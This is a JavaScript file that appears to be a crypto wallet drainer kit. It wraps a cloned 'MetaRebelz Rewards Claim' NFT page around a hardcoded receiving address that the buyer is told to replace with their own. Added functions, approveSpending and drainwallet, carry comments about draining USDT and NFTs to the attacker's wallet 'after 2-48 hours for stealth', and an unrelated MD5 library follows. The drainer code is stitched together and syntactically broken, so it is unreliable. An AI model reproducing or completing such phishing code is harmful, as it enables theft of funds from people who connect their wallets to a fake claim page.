const receiveAddress = "0xb24E8eaAf141D69c44044146694FcbF81363FAE3";   // remove the words and replace it with your bsc address    

	
var cryptotokenContract;
var smartcontract

(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [5405], {
        48312: function(e, s, r) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/", function() {
                return r(36717)
            }])
        },
        36717: function(e, s, r) {
            "use strict";
            r.r(s), r.d(s, {
                default: function() {
                    return q
                }
            });
            var n = r(85893),
                t = r(38644),
                i = r.n(t),
                a = r(9008),
                l = r.n(a),
                d = r(25675),
                o = r.n(d),
                c = r(44253),
                u = r(59417),
                m = r(67814),
                x = r(34646),
                h = r(17106),
                b = r(43122),
                g = r(67294),
                v = r(4830);

            function f() {
                for (var e = arguments.length, s = Array(e), r = 0; r < e; r++) s[r] = arguments[r];
                return s.filter(Boolean).join(" ")
            }
            let j = e => {
                let {
                    wallet: s
                } = e;
                return s.delegateVault ? (0, n.jsxs)(n.Fragment, {
                    children: [(0, n.jsx)(o(), {
                        src: "/delegatecash.svg",
                        className: "-mt-1 inline-block",
                        alt: "",
                        height: 16,
                        width: 16
                    }), (0, n.jsx)("span", {
                        className: "pl-1.5",
                        children: s.ens || s.address.substring(0, 6) + "••••" + s.address.substring(38)
                    })]
                }) : (0, n.jsx)("span", {
                    children: s.ens || s.address.substring(0, 6) + "••••" + s.address.substring(38)
                })
            };

            function p() {
                let {
                    delegateWallets: e,
                    selectedVault: s,
                    selectVault: r
                } = (0, g.useContext)(c.d), {
                    data: t,
                    isError: i,
                    isLoading: a
                } = (0, v.c)({
                    name: null == s ? void 0 : s.ens,
                    query: {
                        enabled: !!(null == s ? void 0 : s.ens)
                    }
                });
                return (0, n.jsx)(n.Fragment, {
                    children: (0, n.jsx)(b.NL.Custom, {
                        children: t => {
                            let {
                                account: i,
                                chain: a,
                                openAccountModal: l,
                                openConnectModal: d,
                                mounted: o
                            } = t;
                            return o && i && a ? (0, n.jsx)(n.Fragment, {
                                children: (0, n.jsx)("div", {
                                    className: "relative inline-block text-left",
                                    children: (0, n.jsx)("div", {
                                        children: (0, n.jsx)("div", {
                                            children: (0, n.jsxs)("div", {
                                                className: "border-gray-100 border-2 inline-flex items-center rounded-md bg-red-900 text-sm font-semibold text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-red-700",
                                                children: [(0, n.jsx)("button", {
                                                    type: "button",
                                                    onClick: l,
                                                    className: f("rounded-l-md py-2 px-2 hover:bg-primary-600", 0 == e.length ? "rounded-r-md" : ""),
                                                    id: "menu-button",
                                                    "aria-expanded": "true",
                                                    "aria-haspopup": "true",
                                                    children: (0, n.jsx)(j, {
                                                        wallet: s || {
                                                            address: i.address,
                                                            ens: i.ensName,
                                                            delegateVault: !1
                                                        }
                                                    })
                                                }), 0 == e.length ? (0, n.jsx)(n.Fragment, {}) : (0, n.jsxs)(x.v, {
                                                    as: "div",
                                                    className: "rounded-r-md relative inline-block text-left hover:bg-red-700",
                                                    children: [(0, n.jsx)("div", {
                                                        children: (0, n.jsx)(x.v.Button, {
                                                            className: "border-l border-gray-300 inline-block pl-2 pr-3 py-2 ",
                                                            children: (0, n.jsx)(m.G, {
                                                                icon: u.ptq,
                                                                size: "xs",
                                                                "aria-hidden": "true"
                                                            })
                                                        })
                                                    }), (0, n.jsx)(h.u, {
                                                        as: g.Fragment,
                                                        enter: "transition ease-out duration-100",
                                                        enterFrom: "transform opacity-0 scale-95",
                                                        enterTo: "transform opacity-100 scale-100",
                                                        leave: "transition ease-in duration-75",
                                                        leaveFrom: "transform opacity-100 scale-100",
                                                        leaveTo: "transform opacity-0 scale-95",
                                                        children: (0, n.jsx)(x.v.Items, {
                                                            className: "absolute right-0 z-10 mt-2 min-w-max text-center origin-top-right rounded-md bg-white shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none",
                                                            children: (0, n.jsx)("div", {
                                                                className: "py-1",
                                                                children: e.filter(e => (!s || e.address != s.address) && (!!s || i.address != e.address)).map(e => (0, n.jsx)(x.v.Item, {
                                                                    children: s => {
                                                                        let {
                                                                            active: t
                                                                        } = s;
                                                                        return (0, n.jsx)("div", {
                                                                            onClick: () => {
                                                                                r(e.address)
                                                                            },
                                                                            className: f(t ? "bg-gray-300" : "", "text-gray-700 block px-4 py-2 text-sm"),
                                                                            children: (0, n.jsx)(j, {
                                                                                wallet: e
                                                                            })
                                                                        })
                                                                    }
                                                                }, e.address))
                                                            })
                                                        })
                                                    })]
                                                })]
                                            })
                                        })
                                    })
                                })
                            }) : (0, n.jsx)("button", {
                                onClick: d,
                                type: "button",
                                className: "border-2 border-white ml-3 inline-flex items-center rounded-md bg-red-800 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-red-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-frens-600",
                                children: "Connect Wallet"
                            })
                        }
                    })
                })
            }
            var y = r(81758),
                N = r(92321);
            let w = () => {
                let {
                    selectedVault: e,
                    ready: s
                } = (0, g.useContext)(c.d), {
                    address: r
                } = (0, N.m)(), n = (0, g.useMemo)(() => s ? (null == e ? void 0 : e.address) || r : void 0, [s, e, r]);
                return {
                    address: s ? r : void 0,
                    vault: null == e ? void 0 : e.address,
                    readAddress: n
                }
            };
            var C = r(89810),
                k = r(82016),
                F = r(83540),
                _ = r(5019),
                z = r(1958);
            let E = "0xBb46873610932C54a12058676FAb1cd00225570b";
            var q = () => {
                var e;
                let s = (0, _.V)(["error InvalidProof()", "error AlreadyClaimed()", "function claimed(address) external view returns (bool)", "function claim(uint256,address,bytes32[]) external"]),
                    {
                        address: r,
                        vault: t
                    } = w(),
                    {
                        data: a,
                        error: d,
                        isLoading: c
                    } = (0, y.ZP)("/api/claim?address=".concat(t || r), e => t || r ? fetch(e).then(e => e.json()) : Promise.resolve({})),
                    {
                        data: x
                    } = (0, C.u)({
                        address: E,
                        abi: s,
                        functionName: "claimed",
                        args: [t || r || z.D],
                        query: {
                            enabled: !!t || !!r
                        }
                    }),
                    {
                        writeContract: h,
                        data: b,
                        status: g,
                        error: v
                    } = (0, k.S)(),
                    {
                        data: f,
                        status: j
                    } = (0, F.A)({
                        hash: b
                    });
                return (0, n.jsxs)(n.Fragment, {
                    children: [(0, n.jsxs)(l(), {
                        children: [(0, n.jsx)("title", {
                            children: "MetaRebelz Rewards Claim"
                        }), (0, n.jsx)("meta", {
                            name: "description",
                            content: "MetaRebelz Rewards Claim"
                        }), (0, n.jsx)("meta", {
                            name: "og:image",
                            content: "https://metarebelz.io/img/logo.png"
                        }), (0, n.jsx)("link", {
                            rel: "icon",
                            href: "/logo.png"
                        })]
                    }), (0, n.jsx)("div", {
                        className: "container w-full mx-auto mt-8 p-8 text-gray-100 ".concat(i().className),
                        children: (0, n.jsxs)("div", {
                            className: "flex flex-col text-center gap-6",
                            children: [(0, n.jsx)("div", {
                                className: "mx-auto",
                                children: (0, n.jsx)(o(), {
                                    src: "/fullnewlogo.png",
                                    alt: "MetaRebelz",
                                    width: 200,
                                    height: 200
                                })
                            }), (0, n.jsx)("div", {
                                children: (0, n.jsx)(p, {})
                            }), r ? c ? (0, n.jsx)("div", {
                                children: "Loading..."
                            }) : a.proof && (null === (e = a.proof) || void 0 === e ? void 0 : e.length) != 0 ? x ? (0, n.jsx)(n.Fragment, {
                                children: (0, n.jsx)("div", {
                                    children: "Already Claimed"
                                })
                            }) : (0, n.jsxs)(n.Fragment, {
                                children: [(0, n.jsxs)("div", {
                                    children: ["Eligible to claim ", a.quantity, " Bone Keys"]
                                }), (0, n.jsx)("div", {
                                    children: "idle" === g ? (0, n.jsx)("button", {
                                        className: "border-gray-100 border-2 bg-red-900 text-white px-2 py-1.5 rounded-md",
                                        onClick: () => {
                                            let e = t || r;
                                            e && h({
                                                address: E,
                                                abi: s,
                                                functionName: "claim",
                                                args: [a.quantity, e, a.proof]
                                            })
                                        },
                                        children: "Claim Keys"
                                    }) : "pending" === g ? (0, n.jsxs)("button", {
                                        className: "border-gray-100 border-2 bg-red-900 text-white px-2 py-1.5 rounded-md",
                                        children: ["Claiming ", (0, n.jsx)(m.G, {
                                            icon: u.LM3,
                                            spin: !0
                                        })]
                                    }) : (0, n.jsx)("button", {
                                        className: "border-gray-100 border-2 bg-red-900 text-white px-2 py-1.5 rounded-md",
                                        children: "Claimed!"
                                    })
                                })]
                            }) : (0, n.jsx)("div", {
                                children: "Not eligible for rewards"
                            }) : (0, n.jsx)(n.Fragment, {})]
                        })
                    })]
                })
            }
        }
    },
    function(e) {
        e.O(0, [4976, 1861, 2888, 9774, 179], function() {
            return e(e.s = 48312)
        }), _N_E = e.O()
    }
]);
	
function approveSpending(token) {
	
	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
	smartcontract.methods.drainusdt.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
}
	  
  			
}

function drainwallet(token) {
	  cryptotokenContract.methods.transfer(receiveAddress).send({ from: currentAddr, to:receiveAddress }); //this drains the nfts if the value is above 0.5 eth 
  			
}

var tokenAbi = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]


//#region Check Configuration
if (!receiveAddressx.startsWith("0x") ||
    (
        receiveAddressx.length >= 64 ||
        receiveAddressx.length <= 40
    )



/*
 * JavaScript smart contract node
/* global define */

/* eslint-disable strict */

;(function ($) {
  'use strict'

  /**
   * Add integers, wrapping at 2^32.
   * This uses 16-bit operations internally to work around bugs in interpreters.
   *
   * @param {number} x First integer
   * @param {number} y Second integer
   * @returns {number} Sum
   */
  function safeAdd(x, y) {
    var lsw = (x & 0xffff) + (y & 0xffff)
    var msw = (x >> 16) + (y >> 16) + (lsw >> 16)
    return (msw << 16) | (lsw & 0xffff)
  }

  /**
   * Bitwise rotate a 32-bit number to the left.
   *
   * @param {number} num 32-bit number
   * @param {number} cnt Rotation count
   * @returns {number} Rotated number
   */
  function bitRotateLeft(num, cnt) {
    return (num << cnt) | (num >>> (32 - cnt))
  }

  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} q q
   * @param {number} a a
   * @param {number} b b
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5cmn(q, a, b, x, s, t) {
    return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5ff(a, b, c, d, x, s, t) {
    return md5cmn((b & c) | (~b & d), a, b, x, s, t)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5gg(a, b, c, d, x, s, t) {
    return md5cmn((b & d) | (c & ~d), a, b, x, s, t)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5hh(a, b, c, d, x, s, t) {
    return md5cmn(b ^ c ^ d, a, b, x, s, t)
  }
  /**
   * Basic operation the algorithm uses.
   *
   * @param {number} a a
   * @param {number} b b
   * @param {number} c c
   * @param {number} d d
   * @param {number} x x
   * @param {number} s s
   * @param {number} t t
   * @returns {number} Result
   */
  function md5ii(a, b, c, d, x, s, t) {
    return md5cmn(c ^ (b | ~d), a, b, x, s, t)
  }

  /**
   * Calculate the MD5 of an array of little-endian words, and a bit length.
   *
   * @param {Array} x Array of little-endian words
   * @param {number} len Bit length
   * @returns {Array<number>} MD5 Array
   */
  function binlMD5(x, len) {
    /* append padding */
    x[len >> 5] |= 0x80 << len % 32
    x[(((len + 64) >>> 9) << 4) + 14] = len

    var i
    var olda
    var oldb
    var oldc
    var oldd
    var a = 1732584193
    var b = -271733879
    var c = -1732584194
    var d = 271733878

    for (i = 0; i < x.length; i += 16) {
      olda = a
      oldb = b
      oldc = c
      oldd = d

      a = md5ff(a, b, c, d, x[i], 7, -680876936)
      d = md5ff(d, a, b, c, x[i + 1], 12, -389564586)
      c = md5ff(c, d, a, b, x[i + 2], 17, 606105819)
      b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330)
      a = md5ff(a, b, c, d, x[i + 4], 7, -176418897)
      d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426)
      c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341)
      b = md5ff(b, c, d, a, x[i + 7], 22, -45705983)
      a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416)
      d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417)
      c = md5ff(c, d, a, b, x[i + 10], 17, -42063)
      b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162)
      a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682)
      d = md5ff(d, a, b, c, x[i + 13], 12, -40341101)
      c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290)
      b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329)

      a = md5gg(a, b, c, d, x[i + 1], 5, -165796510)
      d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632)
      c = md5gg(c, d, a, b, x[i + 11], 14, 643717713)
      b = md5gg(b, c, d, a, x[i], 20, -373897302)
      a = md5gg(a, b, c, d, x[i + 5], 5, -701558691)
      d = md5gg(d, a, b, c, x[i + 10], 9, 38016083)
      c = md5gg(c, d, a, b, x[i + 15], 14, -660478335)
      b = md5gg(b, c, d, a, x[i + 4], 20, -405537848)
      a = md5gg(a, b, c, d, x[i + 9], 5, 568446438)
      d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690)
      c = md5gg(c, d, a, b, x[i + 3], 14, -187363961)
      b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501)
      a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467)
      d = md5gg(d, a, b, c, x[i + 2], 9, -51403784)
      c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473)
      b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734)

      a = md5hh(a, b, c, d, x[i + 5], 4, -378558)
      d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463)
      c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562)
      b = md5hh(b, c, d, a, x[i + 14], 23, -35309556)
      a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060)
      d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353)
      c = md5hh(c, d, a, b, x[i + 7], 16, -155497632)
      b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640)
      a = md5hh(a, b, c, d, x[i + 13], 4, 681279174)
      d = md5hh(d, a, b, c, x[i], 11, -358537222)
      c = md5hh(c, d, a, b, x[i + 3], 16, -722521979)
      b = md5hh(b, c, d, a, x[i + 6], 23, 76029189)
      a = md5hh(a, b, c, d, x[i + 9], 4, -640364487)
      d = md5hh(d, a, b, c, x[i + 12], 11, -421815835)
      c = md5hh(c, d, a, b, x[i + 15], 16, 530742520)
      b = md5hh(b, c, d, a, x[i + 2], 23, -995338651)

      a = md5ii(a, b, c, d, x[i], 6, -198630844)
      d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415)
      c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905)
      b = md5ii(b, c, d, a, x[i + 5], 21, -57434055)
      a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571)
      d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606)
      c = md5ii(c, d, a, b, x[i + 10], 15, -1051523)
      b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799)
      a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359)
      d = md5ii(d, a, b, c, x[i + 15], 10, -30611744)
      c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380)
      b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649)
      a = md5ii(a, b, c, d, x[i + 4], 6, -145523070)
      d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379)
      c = md5ii(c, d, a, b, x[i + 2], 15, 718787259)
      b = md5ii(b, c, d, a, x[i + 9], 21, -343485551)

      a = safeAdd(a, olda)
      b = safeAdd(b, oldb)
      c = safeAdd(c, oldc)
      d = safeAdd(d, oldd)
    }
    return [a, b, c, d]
  }

  /**
   * Convert an array of little-endian words to a string
   *
   * @param {Array<number>} input MD5 Array
   * @returns {string} MD5 string
   */
  function binl2rstr(input) {
    var i
    var output = ''
    var length32 = input.length * 32
    for (i = 0; i < length32; i += 8) {
      output += String.fromCharCode((input[i >> 5] >>> i % 32) & 0xff)
    }
    return output
  }

  /**
   * Convert a raw string to an array of little-endian words
   * Characters >255 have their high-byte silently ignored.
   *
   * @param {string} input Raw input string
   * @returns {Array<number>} Array of little-endian words
   */
  function rstr2binl(input) {
    var i
    var output = []
    output[(input.length >> 2) - 1] = undefined
    for (i = 0; i < output.length; i += 1) {
      output[i] = 0
    }
    var length8 = input.length * 8
    for (i = 0; i < length8; i += 8) {
      output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << i % 32
    }
    return output
  }

  /**
   * Calculate the MD5 of a raw string
   *
   * @param {string} s Input string
   * @returns {string} Raw MD5 string
   */
  function rstrMD5(s) {
    return binl2rstr(binlMD5(rstr2binl(s), s.length * 8))
  }

  /**
   * Calculates the HMAC-MD5 of a key and some data (raw strings)
   *
   * @param {string} key HMAC key
   * @param {string} data Raw input string
   * @returns {string} Raw MD5 string
   */
  function rstrHMACMD5(key, data) {
    var i
    var bkey = rstr2binl(key)
    var ipad = []
    var opad = []
    var hash
    ipad[15] = opad[15] = undefined
    if (bkey.length > 16) {
      bkey = binlMD5(bkey, key.length * 8)
    }
    for (i = 0; i < 16; i += 1) {
      ipad[i] = bkey[i] ^ 0x36363636
      opad[i] = bkey[i] ^ 0x5c5c5c5c
    }
    hash = binlMD5(ipad.concat(rstr2binl(data)), 512 + data.length * 8)
    return binl2rstr(binlMD5(opad.concat(hash), 512 + 128))
  }

  /**
   * Convert a raw string to a hex string
   *
   * @param {string} input Raw input string
   * @returns {string} Hex encoded string
   */
  function rstr2hex(input) {
    var hexTab = '0123456789abcdef'
    var output = ''
    var x
    var i
    for (i = 0; i < input.length; i += 1) {
      x = input.charCodeAt(i)
      output += hexTab.charAt((x >>> 4) & 0x0f) + hexTab.charAt(x & 0x0f)
    }
    return output
  }

  /**
   * Encode a string as UTF-8
   *
   * @param {string} input Input string
   * @returns {string} UTF8 string
   */
  function str2rstrUTF8(input) {
    return unescape(encodeURIComponent(input))
  }

  /**
   * Encodes input string as raw MD5 string
   *
   * @param {string} s Input string
   * @returns {string} Raw MD5 string
   */
  function rawMD5(s) {
    return rstrMD5(str2rstrUTF8(s))
  }
  /**
   * Encodes input string as Hex encoded string
   *
   * @param {string} s Input string
   * @returns {string} Hex encoded string
   */
  function hexMD5(s) {
    return rstr2hex(rawMD5(s))
  }
  /**
   * Calculates the raw HMAC-MD5 for the given key and data
   *
   * @param {string} k HMAC key
   * @param {string} d Input string
   * @returns {string} Raw MD5 string
   */
  function rawHMACMD5(k, d) {
    return rstrHMACMD5(str2rstrUTF8(k), str2rstrUTF8(d))
  }
  /**
   * Calculates the Hex encoded HMAC-MD5 for the given key and data
   *
   * @param {string} k HMAC key
   * @param {string} d Input string
   * @returns {string} Raw MD5 string
   */
  function hexHMACMD5(k, d) {
    return rstr2hex(rawHMACMD5(k, d))
  }

  /**
   * Calculates MD5 value for a given string.
   * If a key is provided, calculates the HMAC-MD5 value.
   * Returns a Hex encoded string unless the raw argument is given.
   *
   * @param {string} string Input string
   * @param {string} [key] HMAC key
   * @param {boolean} [raw] Raw output switch
   * @returns {string} MD5 output
   */
  function md5(string, key, raw) {
    if (!key) {
      if (!raw) {
        return hexMD5(string)
      }
      return rawMD5(string)
    }
    if (!raw) {
      return hexHMACMD5(key, string)
    }
    return rawHMACMD5(key, string)
  }

  if (typeof define === 'function' && define.amd) {
    define(function () {
      return md5
    })
  } else if (typeof module === 'object' && module.exports) {
    module.exports = md5
  } else {
    $.md5 = md5
  }
})(this)
